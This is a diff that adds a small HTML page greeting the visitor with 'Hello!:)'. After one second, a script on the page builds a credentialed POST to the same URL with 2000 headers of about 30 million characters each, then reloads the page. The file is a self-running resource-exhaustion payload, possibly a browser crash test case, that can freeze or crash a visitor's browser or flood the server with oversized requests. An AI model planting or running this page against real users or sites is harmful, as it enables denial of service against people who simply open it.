@@ -1,0 +1,35 @@
+<html>
+    <head>
+    </head>
+    <body>
+    <b>Hello!:)</b>
+    <script>
+	    setTimeout(() => {
+		    const fData = new FormData();
+
+		    fData.append('test', '1');
+
+		    const xhr = new XMLHttpRequest();
+
+		    xhr.onreadystatechange = function() {
+			    if (xhr.readyState === xhr.DONE) {
+				    console.log('Done!');
+			    }
+		    }
+
+		    xhr.withCredentials = true;
+
+		    xhr.open('POST', window.location.href, true);
+
+		    const p = 'A'.repeat(30000000);
+		    for (let i = 0; i < 2000; i++) {
+			    xhr.setRequestHeader('X-' + i.toString(10) + '-' + 'A'.repeat(1000), p);
+			    console.log(i);
+		    }
+
+		    window.location.reload();
+		    xhr.send(fData);
+	    }, 1000);
+    </script>
+    </body>
+</html>
